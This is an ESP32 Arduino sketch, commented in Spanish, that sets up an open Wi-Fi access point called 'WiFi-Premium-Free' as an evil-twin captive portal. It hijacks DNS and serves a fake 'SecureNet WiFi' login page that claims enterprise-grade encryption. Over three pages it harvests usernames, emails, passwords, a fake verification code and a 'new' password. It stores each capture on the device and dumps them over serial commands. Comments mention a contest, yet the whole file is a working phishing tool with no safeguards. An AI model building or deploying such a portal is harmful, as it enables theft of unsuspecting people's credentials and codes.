// ===== CAPTIVE PORTAL ESP32 - VERSION CONCURSO MEJORADA =====
// Funcionalidad: Captura credenciales y las exporta via Serial
// Comandos Serie: "DUMP" = mostrar datos, "EXPORT" = formato exportable

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <SPIFFS.h>

// ===== CONFIGURACION =====
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
WebServer server(80);

// Variables globales
int totalUsers = 0;
unsigned long startTime = 0;
bool serialMode = false;

// ===== INICIALIZACION SPIFFS =====
void initSPIFFS() {
  if (!SPIFFS.begin(true)) {
    Serial.println("[ERROR] No se pudo inicializar SPIFFS");
    return;
  }
  Serial.println("[OK] SPIFFS inicializado correctamente");
  
  if (!SPIFFS.exists("/captured_data.json")) {
    File file = SPIFFS.open("/captured_data.json", "w");
    if (file) {
      file.println("[]");
      file.close();
      Serial.println("[OK] Archivo de datos creado");
    }
  }
}

// ===== GUARDAR CREDENCIALES =====
void saveCredentials(String username, String email, String password, String userAgent, String ip) {
  File file = SPIFFS.open("/captured_data.json", "r");
  DynamicJsonDocument doc(16384);
  
  if (file) {
    deserializeJson(doc, file);
    file.close();
  }
  
  JsonObject newEntry = doc.createNestedObject();
  newEntry["id"] = totalUsers + 1;
  newEntry["username"] = username;
  newEntry["email"] = email;
  newEntry["password"] = password;
  newEntry["ip_address"] = ip;
  newEntry["user_agent"] = userAgent;
  newEntry["timestamp"] = String(millis() / 1000);
  newEntry["datetime"] = getDateTime();
  
  file = SPIFFS.open("/captured_data.json", "w");
  if (file) {
    serializeJson(doc, file);
    file.close();
    totalUsers++;
    
    Serial.println("\n=== NUEVA CAPTURA ===");
    Serial.println("ID: " + String(totalUsers));
    Serial.println("Usuario: " + username);
    Serial.println("Email: " + email);
    Serial.println("Password: " + password);
    Serial.println("IP: " + ip);
    Serial.println("====================\n");
  }
}

// ===== COMANDOS VIA SERIE =====
void handleSerialCommands() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    command.toUpperCase();
    
    if (command == "DUMP") {
      dumpStoredData();
    }
    else if (command == "EXPORT") {
      exportDataAsText();
    }
    else if (command == "COUNT") {
      Serial.println("Total usuarios capturados: " + String(totalUsers));
    }
    else if (command == "STATS") {
      showStats();
    }
    else if (command == "CLEAR") {
      clearStoredData();
    }
    else if (command == "HELP") {
      showSerialHelp();
    }
    else {
      Serial.println("Comando no reconocido. Escribe 'HELP' para ver comandos disponibles.");
    }
  }
}

// ===== MOSTRAR DATOS ALMACENADOS =====
void dumpStoredData() {
  Serial.println("\n========== DATOS CAPTURADOS ==========");
  File file = SPIFFS.open("/captured_data.json", "r");
  if (!file) {
    Serial.println("No hay datos almacenados");
    return;
  }
  
  DynamicJsonDocument doc(16384);
  deserializeJson(doc, file);
  file.close();
  
  if (doc.size() == 0) {
    Serial.println("No hay credenciales capturadas");
  } else {
    for (JsonObject entry : doc.as<JsonArray>()) {
      Serial.println("--- Registro " + String(entry["id"].as<int>()) + " ---");
      Serial.println("Usuario: " + String(entry["username"].as<const char*>()));
      Serial.println("Email: " + String(entry["email"].as<const char*>()));
      Serial.println("Password: " + String(entry["password"].as<const char*>()));
      Serial.println("IP: " + String(entry["ip_address"].as<const char*>()));
      Serial.println("Fecha/Hora: " + String(entry["datetime"].as<const char*>()));
      Serial.println("User-Agent: " + String(entry["user_agent"].as<const char*>()));
      Serial.println("");
    }
  }
  Serial.println("======================================\n");
}

// ===== EXPORTAR COMO TEXTO PLANO =====
void exportDataAsText() {
  Serial.println("\n========== EXPORTACION PARA CONCURSO ==========");
  File file = SPIFFS.open("/captured_data.json", "r");
  if (!file) {
    Serial.println("ERROR: No hay datos para exportar");
    return;
  }
  
  DynamicJsonDocument doc(16384);
  deserializeJson(doc, file);
  file.close();
  
  Serial.println("ESP32 Captive Portal - Resultados de Captura");
  Serial.println("============================================");
  Serial.println("Total de credenciales capturadas: " + String(totalUsers));
  Serial.println("Tiempo de operacion: " + String((millis() - startTime) / 60000) + " minutos");
  Serial.println("============================================");
  Serial.println("");
  
  if (doc.size() == 0) {
    Serial.println("No se capturaron credenciales durante la prueba.");
  } else {
    Serial.println("CREDENCIALES CAPTURADAS:");
    Serial.println("------------------------");
    
    for (JsonObject entry : doc.as<JsonArray>()) {
      Serial.println("Registro #" + String(entry["id"].as<int>()));
      Serial.println("  Usuario: " + String(entry["username"].as<const char*>()));
      Serial.println("  Email: " + String(entry["email"].as<const char*>()));
      Serial.println("  Contraseña: " + String(entry["password"].as<const char*>()));
      Serial.println("  IP de origen: " + String(entry["ip_address"].as<const char*>()));
      Serial.println("  Capturado: " + String(entry["datetime"].as<const char*>()));
      Serial.println("  Navegador: " + String(entry["user_agent"].as<const char*>()));
      Serial.println("  ---");
    }
  }
  Serial.println("============================================");
  Serial.println("Fin del reporte - " + getDateTime());
  Serial.println("============================================\n");
}

// ===== ESTADISTICAS =====
void showStats() {
  Serial.println("\n========== ESTADISTICAS ACTUALES ==========");
  Serial.println("Credenciales capturadas: " + String(totalUsers));
  Serial.println("Dispositivos conectados: " + String(WiFi.softAPgetStationNum()));
  Serial.println("Tiempo activo: " + String((millis() - startTime) / 60000) + " minutos");
  Serial.println("Memoria libre: " + String(ESP.getFreeHeap()) + " bytes");
  Serial.println("SSID del portal: WiFi-Premium-Free");
  Serial.println("IP del portal: 192.168.4.1");
  Serial.println("==========================================\n");
}

// ===== LIMPIAR DATOS =====
void clearStoredData() {
  File file = SPIFFS.open("/captured_data.json", "w");
  if (file) {
    file.println("[]");
    file.close();
    totalUsers = 0;
    Serial.println("Datos limpiados correctamente.");
  } else {
    Serial.println("Error al limpiar datos.");
  }
}

// ===== AYUDA COMANDOS SERIE =====
void showSerialHelp() {
  Serial.println("\n========== COMANDOS DISPONIBLES ==========");
  Serial.println("DUMP    - Mostrar todos los datos capturados");
  Serial.println("EXPORT  - Exportar reporte para concurso");
  Serial.println("COUNT   - Mostrar total de usuarios capturados");
  Serial.println("STATS   - Mostrar estadisticas del sistema");
  Serial.println("CLEAR   - Limpiar todos los datos almacenados");
  Serial.println("HELP    - Mostrar esta ayuda");
  Serial.println("==========================================\n");
}

// ===== OBTENER FECHA/HORA =====
String getDateTime() {
  unsigned long seconds = (millis() - startTime) / 1000;
  int hours = (seconds / 3600) % 24;
  int minutes = (seconds / 60) % 60;
  int secs = seconds % 60;
  
  String h = (hours < 10) ? "0" + String(hours) : String(hours);
  String m = (minutes < 10) ? "0" + String(minutes) : String(minutes);
  String s = (secs < 10) ? "0" + String(secs) : String(secs);
  
  return h + ":" + m + ":" + s;
}

// ===== LEER DATOS =====
String getStoredData() {
  File file = SPIFFS.open("/captured_data.json", "r");
  if (!file) return "[]";
  
  String content = file.readString();
  file.close();
  return content;
}

// ===== RUTAS DEL SERVIDOR =====
void setupRoutes() {
  server.onNotFound(handlePortal);
  server.on("/", handlePortal);
  server.on("/login", HTTP_GET, handlePortal);
  server.on("/login", HTTP_POST, handleLoginPost);
  server.on("/verify", HTTP_POST, handleVerifyPost);
  server.on("/password", HTTP_POST, handlePasswordPost);
  server.on("/admin", handleAdmin);
  
  // Detectores de portal cautivo
  server.on("/generate_204", handlePortal);
  server.on("/ncsi.txt", handlePortal);
  server.on("/hotspot-detect.html", handlePortal);
  server.on("/connecttest.txt", handlePortal);
}

// ===== PAGINA PRINCIPAL =====
void handlePortal() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>SecureNet WiFi</title>";
  html += "<meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<style>";
  html += "* { margin: 0; padding: 0; box-sizing: border-box; }";
  html += "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; ";
  html += "background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }";
  html += ".container { background: #ffffff; padding: 50px 40px; border-radius: 16px; box-shadow: 0 25px 50px rgba(0,0,0,0.15); max-width: 450px; width: 90%; position: relative; }";
  html += ".header { text-align: center; margin-bottom: 40px; }";
  html += ".logo { width: 60px; height: 60px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); ";
  html += "border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; font-weight: bold; }";
  html += ".header h1 { color: #2c3e50; font-size: 32px; margin-bottom: 10px; font-weight: 300; }";
  html += ".header p { color: #7f8c8d; font-size: 16px; }";
  html += ".form-group { margin-bottom: 25px; position: relative; }";
  html += ".form-group label { display: block; margin-bottom: 8px; color: #2c3e50; font-weight: 500; font-size: 14px; }";
  html += ".form-group input { width: 100%; padding: 16px 20px; border: 2px solid #ecf0f1; border-radius: 10px; ";
  html += "font-size: 16px; transition: all 0.3s ease; background: #fafbfc; }";
  html += ".form-group input:focus { outline: none; border-color: #667eea; background: #ffffff; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }";
  html += ".btn { width: 100%; padding: 18px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); ";
  html += "color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; ";
  html += "transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 0.5px; }";
  html += ".btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3); }";
  html += ".btn:active { transform: translateY(0); }";
  html += ".security-info { background: #f8f9fa; padding: 20px; border-radius: 10px; margin-top: 30px; border-left: 4px solid #27ae60; }";
  html += ".security-info h3 { color: #27ae60; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; }";
  html += ".security-info p { color: #5a6c7d; font-size: 14px; line-height: 1.5; }";
  html += ".icon { margin-right: 8px; }";
  html += ".divider { text-align: center; margin: 30px 0 20px; color: #bdc3c7; font-size: 14px; position: relative; }";
  html += ".divider:before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: #ecf0f1; z-index: 1; }";
  html += ".divider span { background: #ffffff; padding: 0 20px; position: relative; z-index: 2; }";
  html += "</style></head><body>";
  
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<div class='logo'>S</div>";
  html += "<h1>SecureNet WiFi</h1>";
  html += "<p>Acceso seguro y protegido</p>";
  html += "</div>";
  
  html += "<form method='POST' action='/login' id='loginForm'>";
  html += "<div class='form-group'>";
  html += "<label><span class='icon'>👤</span>Nombre de Usuario</label>";
  html += "<input type='text' name='username' placeholder='Ingresa tu nombre de usuario' required>";
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label><span class='icon'>📧</span>Correo Electronico</label>";
  html += "<input type='email' name='email' placeholder='ejemplo@correo.com' required>";
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label><span class='icon'>🔒</span>Contraseña</label>";
  html += "<input type='password' name='password' placeholder='Tu contraseña segura' required>";
  html += "</div>";
  
  html += "<button type='submit' class='btn'>Conectar</button>";
  html += "</form>";
  
  html += "<div class='security-info'>";
  html += "<h3><span class='icon'>🛡️</span>Conexion Segura</h3>";
  html += "<p>Tu informacion esta protegida con cifrado de nivel empresarial. ";
  html += "Todos los datos son procesados de forma segura siguiendo los estandares internacionales de privacidad.</p>";
  html += "</div>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

// ===== PROCESAR LOGIN =====
void handleLoginPost() {
  if (server.hasArg("username") && server.hasArg("email") && server.hasArg("password")) {
    String username = server.arg("username");
    String email = server.arg("email");
    String password = server.arg("password");
    String userAgent = server.header("User-Agent");
    String clientIP = server.client().remoteIP().toString();
    
    // Guardar las credenciales
    saveCredentials(username, email, password, userAgent, clientIP);
    
    // Mostrar ventana de verificacion
    String verifyHtml = "<!DOCTYPE html><html><head>";
    verifyHtml += "<title>Verificacion de Correo</title>";
    verifyHtml += "<meta charset='UTF-8'>";
    verifyHtml += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    verifyHtml += "<style>";
    verifyHtml += "* { margin: 0; padding: 0; box-sizing: border-box; }";
    verifyHtml += "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; ";
    verifyHtml += "background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }";
    verifyHtml += ".container { background: #ffffff; padding: 50px 40px; border-radius: 16px; box-shadow: 0 25px 50px rgba(0,0,0,0.15); max-width: 450px; width: 90%; text-align: center; }";
    verifyHtml += ".icon-large { width: 80px; height: 80px; background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); ";
    verifyHtml += "border-radius: 50%; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; color: white; font-size: 36px; }";
    verifyHtml += "h1 { color: #2c3e50; font-size: 28px; margin-bottom: 15px; font-weight: 300; }";
    verifyHtml += "p { color: #7f8c8d; font-size: 16px; margin-bottom: 30px; line-height: 1.5; }";
    verifyHtml += ".email-display { background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 20px 0; color: #2c3e50; font-weight: 600; }";
    verifyHtml += ".form-group { margin-bottom: 25px; position: relative; }";
    verifyHtml += ".form-group input { width: 100%; padding: 16px 20px; border: 2px solid #ecf0f1; border-radius: 10px; ";
    verifyHtml += "font-size: 20px; text-align: center; letter-spacing: 5px; font-weight: bold; color: #2c3e50; }";
    verifyHtml += ".btn { width: 100%; padding: 16px; margin: 10px 0; border: none; border-radius: 10px; ";
    verifyHtml += "font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; text-transform: uppercase; }";
    verifyHtml += ".btn-primary { background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%); color: white; }";
    verifyHtml += ".btn-secondary { background: #ecf0f1; color: #7f8c8d; }";
    verifyHtml += ".btn:hover { transform: translateY(-2px); }";
    verifyHtml += ".link-btn { background: none; border: none; color: #3498db; text-decoration: underline; cursor: pointer; font-size: 14px; }";
    verifyHtml += "</style></head><body>";
    
    verifyHtml += "<div class='container'>";
    verifyHtml += "<div class='icon-large'>📧</div>";
    verifyHtml += "<h1>Verificacion de Correo</h1>";
    verifyHtml += "<p>Hemos enviado un codigo de verificacion de 6 digitos a tu correo electronico:</p>";
    verifyHtml += "<div class='email-display'>" + email + "</div>";
    verifyHtml += "<p>Ingresa el codigo para continuar con tu conexion segura.</p>";
    
    verifyHtml += "<form method='POST' action='/verify'>";
    verifyHtml += "<input type='hidden' name='email' value='" + email + "'>";
    verifyHtml += "<input type='hidden' name='username' value='" + username + "'>";
    verifyHtml += "<div class='form-group'>";
    verifyHtml += "<input type='text' name='code' placeholder='000000' maxlength='6' pattern='[0-9]{6}' required>";
    verifyHtml += "</div>";
    verifyHtml += "<button type='submit' class='btn btn-primary'>Verificar Codigo</button>";
    verifyHtml += "</form>";
    
    verifyHtml += "<button class='btn btn-secondary' onclick='resendCode()'>Reenviar Codigo</button>";
    verifyHtml += "<br><br>";
    verifyHtml += "<button class='link-btn' onclick='changeEmail()'>Cambiar Correo Electronico</button>";
    
    verifyHtml += "<script>";
    verifyHtml += "function resendCode() { alert('Codigo reenviado a " + email + "'); }";
    verifyHtml += "function changeEmail() { window.location.href = '/'; }";
    verifyHtml += "</script>";
    
    verifyHtml += "</div></body></html>";
    
    server.send(200, "text/html", verifyHtml);
  }
}

// ===== PROCESAR VERIFICACION =====
void handleVerifyPost() {
  if (server.hasArg("code") && server.hasArg("email") && server.hasArg("username")) {
    String code = server.arg("code");
    String email = server.arg("email");
    String username = server.arg("username");
    String userAgent = server.header("User-Agent");
    String clientIP = server.client().remoteIP().toString();
    
    // Guardar el intento de verificacion
    saveCredentials(username + "_verify", email, code, userAgent, clientIP);
    
    // Mostrar ventana de cambio de contraseña
    String passwordHtml = "<!DOCTYPE html><html><head>";
    passwordHtml += "<title>Reforzar Seguridad</title>";
    passwordHtml += "<meta charset='UTF-8'>";
    passwordHtml += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    passwordHtml += "<style>";
    passwordHtml += "* { margin: 0; padding: 0; box-sizing: border-box; }";
    passwordHtml += "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; ";
    passwordHtml += "background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }";
    passwordHtml += ".container { background: #ffffff; padding: 50px 40px; border-radius: 16px; box-shadow: 0 25px 50px rgba(0,0,0,0.15); max-width: 450px; width: 90%; }";
    passwordHtml += ".icon-large { width: 80px; height: 80px; background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); ";
    passwordHtml += "border-radius: 50%; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; color: white; font-size: 36px; }";
    passwordHtml += "h1 { color: #2c3e50; font-size: 26px; margin-bottom: 15px; font-weight: 300; text-align: center; }";
    passwordHtml += "p { color: #7f8c8d; font-size: 16px; margin-bottom: 30px; line-height: 1.5; text-align: center; }";
    passwordHtml += ".warning-box { background: #fff3cd; border: 1px solid #ffeaa7; padding: 20px; border-radius: 10px; margin-bottom: 30px; }";
    passwordHtml += ".warning-box h3 { color: #856404; margin-bottom: 10px; }";
    passwordHtml += ".warning-box p { color: #856404; font-size: 14px; margin: 0; text-align: left; }";
    passwordHtml += ".form-group { margin-bottom: 25px; position: relative; }";
    passwordHtml += ".form-group label { display: block; margin-bottom: 8px; color: #2c3e50; font-weight: 500; font-size: 14px; }";
    passwordHtml += ".form-group input { width: 100%; padding: 16px 20px; border: 2px solid #ecf0f1; border-radius: 10px; ";
    passwordHtml += "font-size: 16px; transition: all 0.3s ease; background: #fafbfc; }";
    passwordHtml += ".form-group input:focus { outline: none; border-color: #e74c3c; background: #ffffff; }";
    passwordHtml += ".btn { width: 100%; padding: 18px; background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); ";
    passwordHtml += "color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; ";
    passwordHtml += "transition: all 0.3s ease; text-transform: uppercase; }";
    passwordHtml += ".btn:hover { transform: translateY(-2px); }";
    passwordHtml += "</style></head><body>";
    
    passwordHtml += "<div class='container'>";
    passwordHtml += "<div class='icon-large'>🔐</div>";
    passwordHtml += "<h1>Reforzar Seguridad</h1>";
    passwordHtml += "<p>Por tu seguridad, necesitamos que establezcas una contraseña mas robusta.</p>";
    
    passwordHtml += "<div class='warning-box'>";
    passwordHtml += "<h3>🚨 Alerta de Seguridad</h3>";
    passwordHtml += "<p>Tu contraseña actual no cumple con nuestros estandares de seguridad actualizados. ";
    passwordHtml += "Para proteger tu cuenta, establece una contraseña que contenga al menos 8 caracteres, ";
    passwordHtml += "incluyendo mayusculas, minusculas, numeros y simbolos.</p>";
    passwordHtml += "</div>";
    
    passwordHtml += "<form method='POST' action='/password'>";
    passwordHtml += "<input type='hidden' name='email' value='" + email + "'>";
    passwordHtml += "<input type='hidden' name='username' value='" + username + "'>";
    passwordHtml += "<div class='form-group'>";
    passwordHtml += "<label>🔒 Nueva Contraseña Segura</label>";
    passwordHtml += "<input type='password' name='newpassword' placeholder='Minimo 8 caracteres, incluye simbolos' required>";
    passwordHtml += "</div>";
    passwordHtml += "<div class='form-group'>";
    passwordHtml += "<label>🔒 Confirmar Nueva Contraseña</label>";
    passwordHtml += "<input type='password' name='confirmpassword' placeholder='Repite tu nueva contraseña' required>";
    passwordHtml += "</div>";
    passwordHtml += "<button type='submit' class='btn'>Actualizar y Conectar</button>";
    passwordHtml += "</form>";
    
    passwordHtml += "</div></body></html>";
    
    server.send(200, "text/html", passwordHtml);
  }
}

// ===== PROCESAR NUEVA CONTRASEÑA =====
void handlePasswordPost() {
  if (server.hasArg("newpassword") && server.hasArg("email") && server.hasArg("username")) {
    String newPassword = server.arg("newpassword");
    String confirmPassword = server.arg("confirmpassword");
    String email = server.arg("email");
    String username = server.arg("username");
    String userAgent = server.header("User-Agent");
    String clientIP = server.client().remoteIP().toString();
    
    // Guardar la nueva contraseña
    saveCredentials(username + "_newpass", email, newPassword, userAgent, clientIP);
    
    // Pagina de exito final
    String successHtml = "<!DOCTYPE html><html><head>";
    successHtml += "<title>Conexion Exitosa</title>";
    successHtml += "<meta charset='UTF-8'>";
    successHtml += "<meta http-equiv='refresh' content='5;url=/'>";
    successHtml += "<style>";
    successHtml += "* { margin: 0; padding: 0; box-sizing: border-box; }";
    successHtml += "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; ";
    successHtml += "background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: white; }";
    successHtml += ".container { text-align: center; padding: 50px; }";
    successHtml += ".icon-success { width: 120px; height: 120px; background: rgba(255,255,255,0.2); ";
    successHtml += "border-radius: 50%; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; font-size: 60px; }";
    successHtml += "h1 { font-size: 36px; margin-bottom: 20px; font-weight: 300; }";
    successHtml += "p { font-size: 18px; margin-bottom: 15px; opacity: 0.9; }";
    successHtml += ".loading { margin-top: 30px; }";
    successHtml += ".dot { display: inline-block; width: 12px; height: 12px; background: white; border-radius: 50%; margin: 0 5px; ";
    successHtml += "animation: loading 1.4s infinite ease-in-out both; }";
    successHtml += ".dot:nth-child(1) { animation-delay: -0.32s; }";
    successHtml += ".dot:nth-child(2) { animation-delay: -0.16s; }";
    successHtml += "@keyframes loading { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }";
    successHtml += "</style></head><body>";
    
    successHtml += "<div class='container'>";
    successHtml += "<div class='icon-success'>✓</div>";
    successHtml += "<h1>Conexion Exitosa</h1>";
    successHtml += "<p>Bienvenido, " + username + "</p>";
    successHtml += "<p>Tu acceso WiFi ha sido configurado correctamente</p>";
    successHtml += "<p>Redirigiendo al portal principal...</p>";
    successHtml += "<div class='loading'>";
    successHtml += "<div class='dot'></div>";
    successHtml += "<div class='dot'></div>";
    successHtml += "<div class='dot'></div>";
    successHtml += "</div>";
    successHtml += "</div></body></html>";
    
    server.send(200, "text/html", successHtml);
  }
}

// ===== PANEL ADMIN =====
void handleAdmin() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Panel Admin</title><meta charset='UTF-8'>";
  html += "<style>body{font-family:Arial;margin:20px;background:#f5f5f5;}";
  html += ".container{max-width:800px;margin:0 auto;}";
  html += ".header{background:#2c3e50;color:white;padding:20px;border-radius:10px;text-align:center;}";
  html += ".stats{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin:20px 0;}";
  html += ".stat-card{background:white;padding:20px;border-radius:10px;text-align:center;}";
  html += ".stat-number{font-size:36px;font-weight:bold;color:#3498db;}";
  html += "</style></head><body>";
  
  html += "<div class='container'>";
  html += "<div class='header'><h1>Panel de Control</h1></div>";
  html += "<div class='stats'>";
  html += "<div class='stat-card'><div class='stat-number'>" + String(totalUsers) + "</div><p>Credenciales</p></div>";
  html += "<div class='stat-card'><div class='stat-number'>" + String(WiFi.softAPgetStationNum()) + "</div><p>Conectados</p></div>";
  html += "<div class='stat-card'><div class='stat-number'>" + String((millis() - startTime) / 60000) + "</div><p>Minutos</p></div>";
  html += "</div>";
  html += "<p><strong>Para extraer datos:</strong> Conecta el ESP32 al PC y usa los comandos serie</p>";
  html += "<p><strong>Comandos:</strong> DUMP, EXPORT, STATS, HELP</p>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

// ===== SETUP =====
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n========================================");
  Serial.println("    ESP32 CAPTIVE PORTAL - CONCURSO");
  Serial.println("========================================");
  Serial.println("Iniciando sistema...");
  
  startTime = millis();
  initSPIFFS();
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP("WiFi-Premium-Free", "");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  setupRoutes();
  server.begin();
  
  Serial.println("\n[SISTEMA ACTIVO]");
  Serial.println("SSID: WiFi-Premium-Free");
  Serial.println("Portal: http://192.168.4.1");
  Serial.println("Admin: http://192.168.4.1/admin");
  Serial.println("\nCOMANDOS SERIE DISPONIBLES:");
  Serial.println("   DUMP   - Ver datos capturados");
  Serial.println("   EXPORT - Reporte para concurso");
  Serial.println("   STATS  - Estadisticas");
  Serial.println("   HELP   - Ayuda completa");
  Serial.println("\nPortal listo - Esperando capturas...\n");
}

// ===== LOOP =====
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  handleSerialCommands();
  
  static unsigned long lastStats = 0;
  if (millis() - lastStats > 60000) { // Cada minuto
    lastStats = millis();
    Serial.println("[" + getDateTime() + "] Usuarios: " + String(totalUsers) + 
                   " | Conectados: " + String(WiFi.softAPgetStationNum()));
  }
}
